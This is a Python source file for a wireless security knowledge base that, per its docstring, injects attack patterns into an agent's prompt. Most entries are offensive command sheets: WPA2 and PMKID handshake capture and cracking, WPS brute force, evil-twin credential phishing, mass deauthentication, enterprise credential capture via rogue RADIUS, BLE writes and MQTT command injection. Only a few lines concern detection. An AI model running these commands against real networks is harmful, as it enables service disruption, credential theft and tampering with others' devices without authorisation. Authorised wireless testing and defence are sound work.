"""Wireless security knowledge base.

Deep knowledge about wireless vulnerabilities:
1. WiFi attack techniques (WPA/WPA2/WPA3)
2. Bluetooth and BLE exploitation
3. Rogue access point detection
4. WiFi client attacks
5. IoT wireless protocol security
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WirelessPattern:
    """A wireless security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WIRELESS_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "wifi-001", "name": "WiFi Network Attacks",
        "category": "wifi", "severity": "critical",
        "desc": "WiFi WPA/WPA2/WPA3 attack techniques.",
        "detection": (
            "WiFi NETWORK ATTACKS:\n"
            "WPA2 ATTACKS:\n"
            "  # Monitor mode\n"
            "  airmon-ng start wlan0\n"
            "  # Capture handshake\n"
            "  airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon\n"
            "  # Deauth to force handshake\n"
            "  aireplay-ng -0 5 -a <bssid> wlan0mon\n"
            "  # Crack handshake\n"
            "  aircrack-ng -w wordlist.txt capture.cap\n"
            "  hashcat -m 22000 capture.hc22000 wordlist.txt\n"
            "PMKID ATTACK (clientless):\n"
            "  hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon --enable_status=15\n"
            "  hcxpcapngtool -o hash.hc22000 pmkid.pcapng\n"
            "  hashcat -m 22000 hash.hc22000 wordlist.txt\n"
            "WPA3/SAE:\n"
            "  - Dragonblood attacks (CVE-2019-9494/9496)\n"
            "  - Side-channel on SAE handshake\n"
            "  - Downgrade to WPA2 if transition mode\n"
            "WPS:\n"
            "  reaver -i wlan0mon -b <bssid> -vv\n"
            "  bully -b <bssid> wlan0mon\n"
            "  wash -i wlan0mon  # Find WPS-enabled APs"
        ),
        "tools": ["aircrack-ng", "hashcat", "hcxdumptool"],
    },
    {
        "id": "wifi-002", "name": "Bluetooth Exploitation",
        "category": "bluetooth", "severity": "high",
        "desc": "Bluetooth and BLE security assessment.",
        "detection": (
            "BLUETOOTH EXPLOITATION:\n"
            "SCANNING:\n"
            "  hcitool scan  # Classic Bluetooth\n"
            "  hcitool lescan  # BLE devices\n"
            "  bluetoothctl scan on\n"
            "  # Detailed info\n"
            "  hcitool info <bdaddr>\n"
            "  sdptool browse <bdaddr>  # Service discovery\n"
            "BLE ATTACKS:\n"
            "  # GATTacker: MITM for BLE\n"
            "  # Enumerate GATT services\n"
            "  gatttool -b <bdaddr> --primary\n"
            "  gatttool -b <bdaddr> --characteristics\n"
            "  gatttool -b <bdaddr> --char-read -a <handle>\n"
            "  # Write to characteristic\n"
            "  gatttool -b <bdaddr> --char-write-req -a <handle> -n <value>\n"
            "BLUEBORNE:\n"
            "  - RCE over Bluetooth (no pairing needed)\n"
            "  - Affects Android, iOS, Windows, Linux\n"
            "  - CVE-2017-0781/0782/0783/0785\n"
            "BLUETOOTH CLASSIC:\n"
            "  - BlueSmack (L2CAP ping flood DoS)\n"
            "  - BlueBorne (RCE)\n"
            "  - KNOB attack (encryption key negotiation)\n"
            "  - BIAS attack (impersonation)\n"
            "TOOLS:\n"
            "  btlejack  # BLE sniffer and MITM\n"
            "  Ubertooth  # Bluetooth sniffer hardware\n"
            "  GATTacker  # BLE MITM proxy"
        ),
        "tools": ["hcitool", "gatttool", "btlejack"],
    },
    {
        "id": "wifi-003", "name": "Rogue Access Point",
        "category": "rogue_ap", "severity": "critical",
        "desc": "Rogue AP and evil twin attack techniques.",
        "detection": (
            "ROGUE ACCESS POINT:\n"
            "EVIL TWIN:\n"
            "  # Create rogue AP matching target SSID\n"
            "  hostapd-mana hostapd.conf\n"
            "  # DNS + DHCP\n"
            "  dnsmasq -C dnsmasq.conf\n"
            "  # Captive portal for credential capture\n"
            "  # Tools: wifiphisher, fluxion\n"
            "WIFIPHISHER:\n"
            "  wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade\n"
            "  # Scenarios: firmware-upgrade, oauth-login, plugin-update\n"
            "KARMA/MANA:\n"
            "  - Respond to all probe requests\n"
            "  - Devices auto-connect to 'known' networks\n"
            "  - Capture credentials via MITM\n"
            "  - hostapd-mana with karma mode\n"
            "DETECTION:\n"
            "  # Detect rogue APs\n"
            "  airodump-ng wlan0mon  # Look for duplicate SSIDs\n"
            "  # Check MAC vendor vs expected\n"
            "  # Monitor for deauth frames\n"
            "  # Wireless IDS: Kismet\n"
            "  kismet -c wlan0  # Full wireless monitoring"
        ),
        "tools": ["hostapd-mana", "wifiphisher", "kismet"],
    },
    {
        "id": "wifi-004", "name": "WiFi Client Attacks",
        "category": "client", "severity": "high",
        "desc": "Attacks targeting WiFi clients.",
        "detection": (
            "WiFi CLIENT ATTACKS:\n"
            "DEAUTHENTICATION:\n"
            "  aireplay-ng -0 0 -a <bssid> wlan0mon  # Continuous deauth\n"
            "  aireplay-ng -0 0 -a <bssid> -c <client> wlan0mon  # Targeted\n"
            "  mdk4 wlan0mon d  # Mass deauth\n"
            "PROBE REQUEST TRACKING:\n"
            "  - Clients broadcast SSIDs they remember\n"
            "  - Track device movement via probe requests\n"
            "  - Fingerprint devices by probe patterns\n"
            "  airodump-ng wlan0mon  # View probe requests\n"
            "CLIENT ISOLATION BYPASS:\n"
            "  - L3 routing between clients\n"
            "  - ARP spoofing on wireless network\n"
            "  - MAC spoofing to impersonate gateway\n"
            "ENTERPRISE ATTACKS:\n"
            "  # EAP-PEAP credential capture\n"
            "  # Create rogue RADIUS server\n"
            "  eaphammer --cert-wizard\n"
            "  eaphammer -i wlan0 --auth wpa-eap --essid CorpWiFi \\\n"
            "    --creds --negotiate balanced\n"
            "  # Captured credentials: domain\\user:NTHash\n"
            "TOOLS:\n"
            "  eaphammer  # WPA-Enterprise attack tool\n"
            "  mdk4  # Wireless attack toolkit\n"
            "  Responder  # Capture NTLMv2 on wireless"
        ),
        "tools": ["aircrack-ng", "eaphammer", "mdk4"],
    },
    {
        "id": "wifi-005", "name": "IoT Wireless Protocols",
        "category": "iot_wireless", "severity": "high",
        "desc": "IoT wireless protocol security (Zigbee, Z-Wave, LoRa).",
        "detection": (
            "IoT WIRELESS PROTOCOL SECURITY:\n"
            "ZIGBEE (IEEE 802.15.4):\n"
            "  - Default trust center key (well-known)\n"
            "  - Key transport in plaintext during joining\n"
            "  - Replay attacks on frame counter\n"
            "  # Tools: KillerBee, Attify Zigbee Framework\n"
            "  zbstumbler  # Find Zigbee networks\n"
            "  zbdump -c <channel> -w capture.pcap\n"
            "Z-WAVE:\n"
            "  - S0 security: Weak key exchange\n"
            "  - S2: Better but not universal\n"
            "  - Downgrade from S2 to S0\n"
            "  # Tools: EZ-Wave, Scapy-radio\n"
            "LoRa/LoRaWAN:\n"
            "  - ABP devices: Static keys\n"
            "  - OTAA: Better key management\n"
            "  - Frame counter reset attacks\n"
            "  - Gateway impersonation\n"
            "  # Tools: LoRa SDR receivers\n"
            "MQTT (IoT messaging):\n"
            "  - Default: No authentication\n"
            "  - Subscribe to # (all topics)\n"
            "  mosquitto_sub -h <target> -t '#' -v\n"
            "  - Publish malicious commands\n"
            "  mosquitto_pub -h <target> -t 'home/lights' -m 'OFF'\n"
            "CoAP:\n"
            "  - UDP-based, often no DTLS\n"
            "  - Resource discovery: GET /.well-known/core\n"
            "  coap-client -m get coap://<target>/.well-known/core"
        ),
        "tools": ["killerbee", "mosquitto"],
    },
]


class WirelessSecurityKB:
    """Wireless security knowledge base.

    Provides wireless vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WirelessPattern] = {}
        self._log = logger.bind(component="wireless_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load wireless patterns."""
        for data in WIRELESS_PATTERNS:
            pattern = WirelessPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WirelessPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_wireless_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build wireless security prompt."""
        lines = ["## Wireless Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
